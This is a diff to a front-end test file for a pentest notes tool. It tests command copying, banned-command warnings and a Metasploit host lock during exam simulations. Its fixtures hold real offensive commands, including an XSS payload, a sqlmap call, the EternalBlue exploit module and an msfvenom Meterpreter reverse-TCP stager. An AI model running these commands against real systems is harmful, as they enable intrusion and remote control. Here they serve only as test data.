@@ -5,7 +5,7 @@ import { readFileSync } from "node:fs";
 import { join } from "node:path";
 import { MemoryRouter, Route, Routes, useLocation } from "react-router";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
-import type { CardMeta } from "../../../engines/library/store";
+import type { CardMeta } from "../../../engines/library/types";
 import { parseNote, type ManualNote } from "../../../engines/manual";
 import { useArsenalStore } from "../../../features/arsenal/useArsenalStore";
 import { logCommand } from "../../../features/capture/logCommand";
@@ -175,6 +175,15 @@ describe("NoteView commands", () => {
     await waitFor(async () => expect(await navigator.clipboard.readText()).toBe("zzscan -t 198.51.100.20"));
   });
 
+  it("<script>, <TARGET> and XML tags are never placeholders: such a block copies as written, never held back (RAV-48)", async () => {
+    const note = parseNote("03-Tools/Zz Angle.md", ["# Zz Angle", "## Scan", "```bash", "zzxss '<script>alert(1)</script>' <TARGET> <zzConnectorList>", "```"].join("\n"))!;
+    const user = userEvent.setup();
+    mount(note);
+    await navigator.clipboard.writeText("untouched");
+    await user.click(await screen.findByRole("button", { name: "Copy command: Scan: zzxss '<script>alert(1)</script>' <TARGET> <zzConnectorList>" }));
+    await waitFor(async () => expect(await navigator.clipboard.readText()).toBe("zzxss '<script>alert(1)</script>' <TARGET> <zzConnectorList>"));
+  });
+
   it("a plain block copies as is", async () => {
     const user = userEvent.setup();
     mount();
@@ -282,10 +291,78 @@ describe("NoteView commands", () => {
     await waitFor(async () => expect(await navigator.clipboard.readText()).toBe("sqlmap -u http://198.51.100.20/zz"));
   });
 
+  it("until the engagement's kind is known a banned command shows no line and its first copy is held", async () => {
+    m.engagementGet.mockImplementation(() => new Promise(() => {}));
+    const user = userEvent.setup();
+    mount();
+    await screen.findByText((_, el) => el?.tagName === "PRE" && /^sqlmap -u http:\/\//.test(el.textContent ?? ""));
+    expect(screen.queryByText("Not allowed in the exam")).not.toBeInTheDocument();
+    await navigator.clipboard.writeText("untouched");
+    await user.click(screen.getByRole("button", { name: "Copy command: Banned: sqlmap -u http://{TARGET_IP}/zz" }));
+    await waitFor(() => expect(useManualStatus.getState().text).toMatch(/^The exam rules aren't loaded yet\. Press ↵ again/));
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+  });
+
   it("in an exam sim a Meterpreter command shows the Metasploit lock wording", async () => {
     m.engagementGet.mockResolvedValue({ ...E1, kind: "exam-sim" });
     mount();
-    expect(await screen.findByText("Using Meterpreter here makes this your Metasploit machine")).toBeInTheDocument();
+    expect(await screen.findByText("Using Metasploit here makes this your Metasploit machine")).toBeInTheDocument();
+  });
+});
+
+describe("NoteView Metasploit lock", () => {
+  const H2: Host = { ...H1, id: "h2", name: "zzws02.example.test", ip: "198.51.100.22" };
+  const MSF = parseNote("03-Tools/Zz Msf.md", [
+    "# Zz Msf",
+    "## Module",
+    "```",
+    "use exploit/windows/smb/ms17_010_eternalblue",
+    "```",
+    "## Handler",
+    "```",
+    "use exploit/multi/handler",
+    "```",
+    "## Stager",
+    "```",
+    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} -f exe",
+    "```",
+  ].join("\n"))!;
+  const LOCKED = "Metasploit is locked to zzws02";
+  const MODULE = "Module: use exploit/windows/smb/ms17_010_eternalblue";
+  const ruleIn = async (name: string) => (await cmdGroup(name)).querySelector(".manual-command__rule");
+
+  beforeEach(() => {
+    m.hostsList.mockResolvedValue([H1, H2]);
+  });
+
+  it("in an exam sim locked to another host, a module block shows the lock line and its first copy is held", async () => {
+    m.engagementGet.mockResolvedValue({ ...E1, kind: "exam-sim", msfHostId: "h2" });
+    const user = userEvent.setup();
+    mount(MSF);
+    await waitFor(async () => expect(await ruleIn(MODULE)).toHaveTextContent(LOCKED));
+    expect(await ruleIn(MODULE)).toHaveClass("manual-command__rule--warn");
+    await navigator.clipboard.writeText("untouched");
+    const copy = screen.getByRole("button", { name: `Copy command: ${MODULE}` });
+    await user.click(copy);
+    await waitFor(() => expect(useManualStatus.getState().text).toBe(`${LOCKED}. Press ↵ again to copy anyway`));
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    await user.click(copy);
+    await waitFor(async () => expect(await navigator.clipboard.readText()).toBe("use exploit/windows/smb/ms17_010_eternalblue"));
+  });
+
+  it("in an exam sim a multi/handler block gets no lock line, and a Meterpreter block still does", async () => {
+    m.engagementGet.mockResolvedValue({ ...E1, kind: "exam-sim", msfHostId: "h2" });
+    mount(MSF);
+    await waitFor(async () =>
+      expect(await ruleIn("Stager: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} -f exe")).toHaveTextContent(LOCKED));
+    expect(await ruleIn("Handler: use exploit/multi/handler")).toBeNull();
+  });
+
+  it("outside an exam sim no Metasploit block gets a lock line", async () => {
+    m.engagementGet.mockResolvedValue({ ...E1, msfHostId: "h2" });
+    mount(MSF);
+    await screen.findByText((_, el) => el?.tagName === "PRE" && el.textContent === "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.0.2.9 -f exe");
+    expect(document.querySelector(".manual-command__rule")).toBeNull();
   });
 });
 
